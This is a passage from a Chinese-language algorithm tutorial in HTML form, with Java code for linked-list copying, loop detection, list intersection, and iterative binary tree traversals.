class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>rand <span class="token operator">=</span> cur<span class="token punctuation">.</span>rand <span class="token operator">==</span> <span class="token keyword">null</span><span class="token operator">?</span><span class="token keyword">null</span><span class="token operator">:</span>cur<span class="token punctuation">.</span>rand<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> res <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> oldNext <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">=</span> oldNext <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> oldNext<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> oldNext<span class="token punctuation">;</span>        cur <span class="token operator">=</span> oldNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-两个单链表相交"><a href="#0x04-两个单链表相交" class="headerlink" title="0x04 两个单链表相交"></a>0x04 两个单链表相交</h3><p>两个可能有环也可能无环的单链表，如果相交（即内存地址相同），则返回相交的第一个节点，否则返回null</p><h4 id="一）首先需要判断两个链表是否有环"><a href="#一）首先需要判断两个链表是否有环" class="headerlink" title="一）首先需要判断两个链表是否有环"></a>一）首先需要判断两个链表是否有环</h4><p><code>getLoopNode(Node head)</code>有环则返回入环节点（即第一个进入环中的节点），否则返回null</p><p>使用快慢指针</p><p>a）无环，则快指针一定会到达null</p><p>b）有环，则快指针一定会与慢指针相遇，相遇之后则停，让快指针跑到头节点，慢指针停在这个相遇点，然后两者都开始每次走一步，再次相遇的点则为入环节点（证明比较麻烦，此处不证明）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// 不让快慢指针都从头开始的原因是需要进入下面的while循环</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>slow<span class="token operator">!=</span>fast<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token operator">!=</span>slow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> fast<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二）分情况讨论"><a href="#二）分情况讨论" class="headerlink" title="二）分情况讨论"></a>二）分情况讨论</h4><p>a）两个都无环的链表（loop1 == null &amp;&amp; loop2 == null）分别遍历两个链表，得到两个链表的长度差值和尾部节点，首先比较尾部节点是否为同一个（如果同一个则一定相交，下面开始找相交的第一个节点，反之，不是同一个的话，一定不相交），然后从长的开始遍历差值步，然后与短的链表一起继续向后遍历，遍历到相同内存地址，则为相交的第一个节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">noLoop</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 只使用一个变量n来获得两个链表的差值，省空间大师</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur1 <span class="token operator">=</span> head1<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur1<span class="token punctuation">.</span>next <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> cur2 <span class="token operator">=</span> head2<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur2<span class="token punctuation">.</span>next <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 执行完上面两个while之后，cur1和cur2即为两个链表的尾部节点</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur1 <span class="token operator">==</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 现在让cur1为长的链表，cur2为短的链表</span>        cur1 <span class="token operator">=</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>        cur2 <span class="token operator">=</span> cur1 <span class="token operator">==</span> head1 <span class="token operator">?</span> head2 <span class="token operator">:</span> head1<span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cur1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b）两个都有环的链表（loop1 != null &amp;&amp; loop2 != null）总共就分3种情况，即为下图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f1.png"></p><p>图中第二种情况即为loop1 == loop2，寻找这种情况的第一个相交节点则与<code>a）</code>情况两个都无环链表类似，将loop1或者loop2节点当做两个链表的尾部节点即可采用完全相同的代码</p><p>那么如果两者不相等，则从loop1开始向后遍历，如果相交，则一定会遍历到loop2，返回loop1或者loop2都满足题意，否则一定不相交</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">bothLoop</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">,</span> <span class="token class-name">Node</span> loop1<span class="token punctuation">,</span> <span class="token class-name">Node</span> loop2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">==</span> loop2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur1 <span class="token operator">=</span> head1<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Node</span> cur2 <span class="token operator">=</span> head2<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur2 <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 执行完上面两个while之后，cur1和cur2即为两个链表的入环节点</span>        <span class="token comment">// 现在让cur1为长的链表，cur2为短的链表</span>        cur1 <span class="token operator">=</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>        cur2 <span class="token operator">=</span> cur1 <span class="token operator">==</span> head1 <span class="token operator">?</span> head2 <span class="token operator">:</span> head1<span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cur1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> loop1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> loop2<span class="token punctuation">)</span> <span class="token keyword">return</span> cur<span class="token punctuation">;</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>c）剩下的情况则是有一个链表为无环，另一个则为有环，这种情况一定不会相交</p><blockquote><p>一定记住前提为单链表，即每个节点只有一个next指针，所以以上情况完全囊括了全部可能性</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">findFirstIntersecNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> loop1 <span class="token operator">=</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span>head1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> loop2 <span class="token operator">=</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span>head2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> loop2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">noLoop</span><span class="token punctuation">(</span>head1<span class="token punctuation">,</span> head2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> loop2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">bothLoop</span><span class="token punctuation">(</span>head1<span class="token punctuation">,</span> head2<span class="token punctuation">,</span> loop1<span class="token punctuation">,</span> loop2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="遍历问题"><a href="#遍历问题" class="headerlink" title="遍历问题"></a>遍历问题</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> left<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> right<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token comment">// 第一次回到当前子树的根节点</span>    <span class="token function">f</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 第二次回到当前子树的根节点</span>    <span class="token function">f</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 第三次回到当前子树的根节点</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>显然，对于先序、中序、后序遍历的递归实现往对应的注释出添加打印语句即可</p></blockquote><p>那么对于迭代怎么实现？</p><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>首先准备一个栈，先压入根节点，然后循环以下操作</p><p>1）弹出一个节点，即为cur</p><p>2）打印</p><p>3）先压入右节点，再压入左节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">preTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>由前面的先序遍历可知先压右后压左得出的结果为（根、左、右），那么先压左后压右则得出（根、右、左），所以将（根、右、左）放在另一个栈里，再弹出，则为左、右、根</p><p>首先准备两个栈，先压入根节点到栈A中，循环以下操作</p><p>1）弹出一个节点，即为cur</p><p>2）将cur压入栈B</p><p>3）先压入左节点，再压入右节点</p><p>打印栈B即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">postTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stackA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stackB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stackA<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> stackA<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            stackB<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stackB<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stackB<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>对于中序来说，入栈顺序则为左、右、根</p><p>1）将以该节点为根节点的树的左子节点全部入栈（即整棵树的左边界入栈）</p><p>2）弹出cur</p><p>3）打印，对cur右子树循环操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 巧妙复用head变量简化代码</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                head <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="宽度优先遍历"><a href="#宽度优先遍历" class="headerlink" title="宽度优先遍历"></a>宽度优先遍历</h4><p>使用队列结构，首先压入根节点，然后循环以下操作</p><p>1）弹出</p><p>2）打印</p><p>3）先压入左节点，再压入右节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">widthFirstTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token 